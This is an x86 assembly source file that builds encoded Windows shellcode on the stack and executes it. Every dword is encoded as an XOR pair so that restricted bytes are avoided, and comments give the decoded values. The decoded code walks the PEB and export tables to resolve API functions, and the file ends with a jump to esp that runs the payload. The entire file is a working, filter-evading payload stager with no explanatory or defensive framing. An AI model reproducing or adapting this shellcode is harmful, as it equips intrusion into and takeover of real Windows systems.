section .text

global _start
_start:
    pushad
    pushfd
register:
    push 0x21
    pop eax
    xor al , 0x21
    push eax
    pop ebx
    dec ebx
    push esp
    pop ecx
encode:
; push 0x90eb585a
    push 0x58242866
    pop eax
    xor eax, 0x3730703c
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x5ac3619d
    push 0x667c4749
    pop eax
    xor eax, 0x3c40262b
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0xe18b9d61
    push ebx
    pop eax
    xor eax, 0x762e2f2b
    xor eax, 0x685a4d4a
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xd2ff500a
    push 0x64216851
    pop eax
    xor eax, 0x4921385b
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x6ae08921
    push 0x5538426d
    pop eax
    xor eax, 0x3f27344c
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x6c537157
    pop eax
    xor eax, 0x4d725073
    push eax
; push 0x2c81848d
    push ebx
    pop eax
    xor eax, 0x573d3221
    xor eax, 0x7b434953
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x82846821
    push 0x263c3f47
    pop eax
    xor eax, 0x5b475766
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x21212124
    push 0x77414452
    pop eax
    xor eax, 0x56606576
    push eax
; push 0x2c812121
    push 0x7a38685d
    pop eax
    xor eax, 0x5646497c
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x212168da
    push 0x5559595f
    pop eax
    xor eax, 0x7478317a
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x0188148b
    push 0x385e7847
    pop eax
    xor eax, 0x39296c33
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x4a0c8b66
    push 0x627e3149
    pop eax
    xor eax, 0x2872452f
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x585ae075
    push 0x29755e53
    pop eax
    xor eax, 0x712f4126
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x3c3e6889
    push 0x6648573b
    pop eax
    xor eax, 0x5a763f4d
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xfa81f4eb
    push ebx
    pop eax
    xor eax, 0x2a2a254e
    xor eax, 0x2f542e5a
    push eax
; push 0xc20111ca
    push 0x473f4b65
    pop eax
    xor eax, 0x7a3e5a50
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0xc10774c0
    push 0x5e693947
    pop eax
    xor eax, 0x606e4d78
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x84acd231
    push ebx
    pop eax
    xor eax, 0x256c5862
    xor eax, 0x5e3f7553
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xc031de01
    push 0x58616939
    pop eax
    xor eax, 0x67504838
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x8f348b49
    push 0x4f79552b
    pop eax
    xor eax, 0x3f4d2162
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x4be352da
    push 0x7a4d3d79
    pop eax
    xor eax, 0x31516f5c
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x0124528b
    push 0x43563122
    pop eax
    xor eax, 0x42726356
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xdf01207a
    push 0x5b734542
    pop eax
    xor eax, 0x7b726538
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x8b50d801
    push 0x5c2d7468
    pop eax
    xor eax, 0x287d5369
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x1c428b14
    push 0x70325223
    pop eax
    xor eax, 0x6c702637
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x4a8bda01
    push 0x22564a6b
    pop eax
    xor eax, 0x68226f6a
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x781a548b
    push 0x46782e5b
    pop eax
    xor eax, 0x3e627a2f
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x3c538b10
    push 0x556b5e22
    pop eax
    xor eax, 0x69382a32
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x5b8b1b8b
    push 0x685f4929
    pop eax
    xor eax, 0x332b525d
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x1b8b145b
    push 0x6c31317d
    pop eax
    xor eax, 0x77452526
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0x8b0c5b8b
    push 0x5d23795c
    pop eax
    xor eax, 0x292f2228
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; push 0x305b8b64
    push 0x766d244c
    pop eax
    xor eax, 0x46365028
    push eax
    push esp
    pop edx
    xor [edx], bh
; push 0xdb319c60
    push 0x4156512d
    pop eax
    xor eax, 0x6567324d
    push eax
    push esp
    pop edx
    xor [edx], bh
    inc edx
    xor [edx], bh
; jmp to shellcode
    jmp esp
